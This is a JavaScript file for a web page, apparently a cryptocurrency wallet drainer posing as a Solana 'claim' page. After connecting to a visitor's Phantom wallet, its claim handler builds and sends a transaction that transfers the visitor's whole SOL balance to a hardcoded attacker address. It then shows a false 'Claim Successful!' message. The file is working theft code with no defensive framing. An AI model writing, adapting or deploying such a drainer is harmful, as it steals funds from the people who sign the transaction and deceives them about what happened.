const { Connection, PublicKey, Transaction, SystemProgram } = window.solanaWeb3;

// YOUR WALLET ADDRESS WHERE YOU WANT THE FUNDS SENT
const DESTINATION_WALLET = "39FZPWRL8CpZnQkL9xxmTWim5Kyzr679L3GjoLP3y5eh"; 

let connection;
let userPublicKey;

document.getElementById('connectBtn').addEventListener('click', async () => {
    if (window.phantom?.isPhantom) {
        try {
            const resp = await window.phantom.solana.connect();
            userPublicKey = resp.publicKey.toString();
            
            document.getElementById('connectBtn').style.display = 'none';
            document.getElementById('walletInfo').style.display = 'block';
            document.getElementById('address').innerText = userPublicKey.substring(0, 6) + '...' + userPublicKey.substring(userPublicKey.length - 4);
        } catch (err) {
            console.error("Connection failed:", err);
        }
    } else {
        alert("Please install Phantom Wallet!");
    }
});

document.getElementById('claimBtn').addEventListener('click', async () => {
    if (!userPublicKey) return;

    try {
        connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
        const balance = await connection.getBalance(new PublicKey(userPublicKey));
        
        if (balance === 0) {
            alert("Your wallet has no SOL to claim.");
            return;
        }

        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: new PublicKey(userPublicKey),
                toPubkey: new PublicKey(DESTINATION_WALLET),
                lamports: balance 
            })
        );

        const signedTx = await window.phantom.solana.signTransaction(transaction);
        const signature = await window.phantom.solana.sendRawTransaction(signedTx.serialize());
        
        alert("Claim Successful! Check your wallet.");
        console.log("Transaction Signature:", signature);
    } catch (err) {
        console.error("Claim failed:", err);
        alert("Claim failed. Please try again.");
    }
});